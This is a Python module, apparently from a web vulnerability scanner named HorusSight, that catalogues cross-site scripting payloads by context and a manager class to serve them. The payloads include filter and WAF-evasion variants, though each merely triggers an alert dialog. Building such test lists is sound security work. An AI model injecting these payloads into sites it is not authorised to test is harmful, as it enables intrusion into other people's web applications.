"""
HorusSight - XSS Payload Arsenal
=================================
Ghost's XSS detection payloads
Foundation: SecureScan AI v5.0 (MIT License)
"""

from typing import List, Dict, Any
from dataclasses import dataclass, field
from enum import Enum


class XSSType(Enum):
    REFLECTED = "reflected"
    STORED = "stored"
    DOM = "dom"


class XSSContext(Enum):
    HTML_BODY = "html_body"
    HTML_ATTRIBUTE = "html_attribute"
    JAVASCRIPT = "javascript"
    URL = "url"
    UNIVERSAL = "universal"


@dataclass
class XSSPayload:
    """XSS payload with metadata."""
    payload: str
    description: str
    xss_type: XSSType = XSSType.REFLECTED
    context: XSSContext = XSSContext.HTML_BODY
    waf_evasion: bool = False
    risk_level: str = "safe"
    confidence: float = 0.8
    tags: List[str] = field(default_factory=list)
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "payload": self.payload,
            "description": self.description,
            "type": self.xss_type.value,
            "context": self.context.value,
            "waf_evasion": self.waf_evasion,
            "risk_level": self.risk_level,
            "confidence": self.confidence,
            "tags": self.tags,
        }


# =============================================================================
# HORUSSIGHT ELITE XSS PAYLOADS
# =============================================================================

ELITE_XSS = [
    XSSPayload(
        payload="<svg/onload=alert(1)>",
        description="Elite: Minimal SVG onload",
        context=XSSContext.HTML_BODY,
        waf_evasion=True,
        confidence=0.94,
        tags=["elite", "svg", "waf_bypass"]
    ),
    XSSPayload(
        payload="<img src=x onerror=alert(1)>",
        description="Elite: Classic img onerror",
        context=XSSContext.HTML_BODY,
        confidence=0.92,
        tags=["elite", "img", "classic"]
    ),
    XSSPayload(
        payload="<details open ontoggle=alert(1)>",
        description="Elite: Details ontoggle",
        context=XSSContext.HTML_BODY,
        waf_evasion=True,
        confidence=0.90,
        tags=["elite", "details", "waf_bypass"]
    ),
    XSSPayload(
        payload="'-alert(1)-'",
        description="Elite: JavaScript context escape",
        context=XSSContext.JAVASCRIPT,
        waf_evasion=True,
        confidence=0.89,
        tags=["elite", "javascript"]
    ),
    XSSPayload(
        payload="<body onload=alert(1)>",
        description="Elite: Body onload",
        context=XSSContext.HTML_BODY,
        waf_evasion=True,
        confidence=0.88,
        tags=["elite", "body", "waf_bypass"]
    ),
]

# =============================================================================
# BASIC XSS PAYLOADS
# =============================================================================

BASIC_XSS = [
    XSSPayload(
        payload="<script>alert(1)</script>",
        description="Basic script alert",
        tags=["basic"]
    ),
    XSSPayload(
        payload="<script>alert('XSS')</script>",
        description="Script alert string",
        tags=["basic"]
    ),
    XSSPayload(
        payload="<script>alert(document.domain)</script>",
        description="Alert domain",
        tags=["basic"]
    ),
    XSSPayload(
        payload="<script>confirm(1)</script>",
        description="Confirm dialog",
        tags=["basic"]
    ),
    XSSPayload(
        payload="<script>prompt(1)</script>",
        description="Prompt dialog",
        tags=["basic"]
    ),
]

# =============================================================================
# EVENT HANDLER XSS
# =============================================================================

EVENT_HANDLER_XSS = [
    XSSPayload(
        payload="<img src=x onerror=alert(1)>",
        description="Img onerror",
        tags=["event"]
    ),
    XSSPayload(
        payload="<body onload=alert(1)>",
        description="Body onload",
        tags=["event"]
    ),
    XSSPayload(
        payload="<input onfocus=alert(1) autofocus>",
        description="Input autofocus",
        tags=["event"]
    ),
    XSSPayload(
        payload="<svg onload=alert(1)>",
        description="SVG onload",
        tags=["event", "svg"]
    ),
    XSSPayload(
        payload="<a href=javascript:alert(1)>click</a>",
        description="Anchor javascript",
        tags=["event"]
    ),
    XSSPayload(
        payload="<div onmouseover=alert(1)>hover</div>",
        description="Div mouseover",
        tags=["event"]
    ),
    XSSPayload(
        payload="<video src=x onerror=alert(1)>",
        description="Video onerror",
        tags=["event"]
    ),
    XSSPayload(
        payload="<iframe onload=alert(1)>",
        description="Iframe onload",
        tags=["event"]
    ),
]

# =============================================================================
# SVG XSS
# =============================================================================

SVG_XSS = [
    XSSPayload(
        payload="<svg onload=alert(1)>",
        description="SVG onload",
        tags=["svg"]
    ),
    XSSPayload(
        payload="<svg/onload=alert(1)>",
        description="SVG no space",
        tags=["svg", "waf_bypass"]
    ),
    XSSPayload(
        payload="<svg><script>alert(1)</script></svg>",
        description="SVG script",
        tags=["svg"]
    ),
    XSSPayload(
        payload="<svg><animate onbegin=alert(1)>",
        description="SVG animate",
        tags=["svg"]
    ),
]

# =============================================================================
# JAVASCRIPT CONTEXT XSS
# =============================================================================

JS_CONTEXT_XSS = [
    XSSPayload(
        payload="';alert(1)//",
        description="Single quote escape",
        context=XSSContext.JAVASCRIPT,
        tags=["js"]
    ),
    XSSPayload(
        payload='";alert(1)//',
        description="Double quote escape",
        context=XSSContext.JAVASCRIPT,
        tags=["js"]
    ),
    XSSPayload(
        payload="</script><script>alert(1)</script>",
        description="Script break",
        context=XSSContext.JAVASCRIPT,
        tags=["js"]
    ),
    XSSPayload(
        payload="'-alert(1)-'",
        description="Minus alert",
        context=XSSContext.JAVASCRIPT,
        tags=["js"]
    ),
    XSSPayload(
        payload="${alert(1)}",
        description="Template interpolation",
        context=XSSContext.JAVASCRIPT,
        tags=["js"]
    ),
]

# =============================================================================
# ATTRIBUTE CONTEXT XSS
# =============================================================================

ATTRIBUTE_XSS = [
    XSSPayload(
        payload='" onmouseover=alert(1) x="',
        description="Double quote escape",
        context=XSSContext.HTML_ATTRIBUTE,
        tags=["attr"]
    ),
    XSSPayload(
        payload="' onmouseover=alert(1) x='",
        description="Single quote escape",
        context=XSSContext.HTML_ATTRIBUTE,
        tags=["attr"]
    ),
    XSSPayload(
        payload='"><script>alert(1)</script>',
        description="Break tag script",
        context=XSSContext.HTML_ATTRIBUTE,
        tags=["attr"]
    ),
    XSSPayload(
        payload='"><img src=x onerror=alert(1)>',
        description="Break tag img",
        context=XSSContext.HTML_ATTRIBUTE,
        tags=["attr"]
    ),
    XSSPayload(
        payload="javascript:alert(1)",
        description="Javascript protocol",
        context=XSSContext.HTML_ATTRIBUTE,
        tags=["attr"]
    ),
]

# =============================================================================
# URL CONTEXT XSS
# =============================================================================

URL_XSS = [
    XSSPayload(
        payload="javascript:alert(1)",
        description="Javascript protocol",
        context=XSSContext.URL,
        tags=["url"]
    ),
    XSSPayload(
        payload="javascript:alert`1`",
        description="Javascript template",
        context=XSSContext.URL,
        tags=["url"]
    ),
    XSSPayload(
        payload="JaVaScRiPt:alert(1)",
        description="Mixed case javascript",
        context=XSSContext.URL,
        tags=["url", "waf_bypass"]
    ),
    XSSPayload(
        payload="data:text/html,<script>alert(1)</script>",
        description="Data URI",
        context=XSSContext.URL,
        tags=["url"]
    ),
]

# =============================================================================
# WAF BYPASS XSS
# =============================================================================

WAF_BYPASS_XSS = [
    XSSPayload(
        payload="<ScRiPt>alert(1)</ScRiPt>",
        description="Mixed case script",
        waf_evasion=True,
        tags=["waf_bypass"]
    ),
    XSSPayload(
        payload="<img src=x oNeRrOr=alert(1)>",
        description="Mixed case onerror",
        waf_evasion=True,
        tags=["waf_bypass"]
    ),
    XSSPayload(
        payload="<script>eval('al'+'ert(1)')</script>",
        description="Concat eval",
        waf_evasion=True,
        tags=["waf_bypass"]
    ),
    XSSPayload(
        payload="<script>Function('alert(1)')()</script>",
        description="Function constructor",
        waf_evasion=True,
        tags=["waf_bypass"]
    ),
]

# =============================================================================
# POLYGLOT XSS
# =============================================================================

POLYGLOT_XSS = [
    XSSPayload(
        payload="'\"--></style></script><script>alert(1)</script>",
        description="Simple polyglot",
        context=XSSContext.UNIVERSAL,
        tags=["polyglot"]
    ),
    XSSPayload(
        payload="'\"><img src=x onerror=alert(1)>",
        description="Quote break polyglot",
        context=XSSContext.UNIVERSAL,
        tags=["polyglot"]
    ),
    XSSPayload(
        payload="</script><script>alert(1)</script>",
        description="Script close polyglot",
        context=XSSContext.UNIVERSAL,
        tags=["polyglot"]
    ),
]


# =============================================================================
# PAYLOAD MANAGER
# =============================================================================

class XSSPayloadManager:
    """Ghost's XSS payload manager."""
    
    def __init__(self):
        self._payloads: List[XSSPayload] = []
        self._load_all()
    
    def _load_all(self):
        self._payloads.extend(ELITE_XSS)
        self._payloads.extend(BASIC_XSS)
        self._payloads.extend(EVENT_HANDLER_XSS)
        self._payloads.extend(SVG_XSS)
        self._payloads.extend(JS_CONTEXT_XSS)
        self._payloads.extend(ATTRIBUTE_XSS)
        self._payloads.extend(URL_XSS)
        self._payloads.extend(WAF_BYPASS_XSS)
        self._payloads.extend(POLYGLOT_XSS)
    
    @property
    def total_count(self) -> int:
        return len(self._payloads)
    
    @property
    def elite_count(self) -> int:
        return len(ELITE_XSS)
    
    def get_all(self) -> List[XSSPayload]:
        return self._payloads.copy()
    
    def get_strings(self) -> List[str]:
        return [p.payload for p in self._payloads]
    
    def get_by_context(self, context: XSSContext) -> List[XSSPayload]:
        return [p for p in self._payloads if p.context in (context, XSSContext.UNIVERSAL)]
    
    def get_waf_bypass(self) -> List[XSSPayload]:
        return [p for p in self._payloads if p.waf_evasion]
    
    def get_quick_tests(self) -> List[XSSPayload]:
        quick = [
            XSSPayload(
                payload="<script>alert(1)</script>",
                description="Basic script"
            ),
            XSSPayload(
                payload="<img src=x onerror=alert(1)>",
                description="Img onerror"
            ),
            XSSPayload(
                payload="<svg onload=alert(1)>",
                description="SVG onload"
            ),
            XSSPayload(
                payload="'\"><img src=x onerror=alert(1)>",
                description="Polyglot",
                context=XSSContext.UNIVERSAL
            ),
        ]
        quick.extend(ELITE_XSS[:2])
        return quick
    
    def get_stats(self) -> Dict[str, Any]:
        return {
            "total": self.total_count,
            "elite": self.elite_count,
            "inherited": self.total_count - self.elite_count,
            "waf_bypass": len(self.get_waf_bypass()),
        }


# Singleton instance
_xss_manager = None


def get_xss_manager() -> XSSPayloadManager:
    global _xss_manager
    if _xss_manager is None:
        _xss_manager = XSSPayloadManager()
    return _xss_manager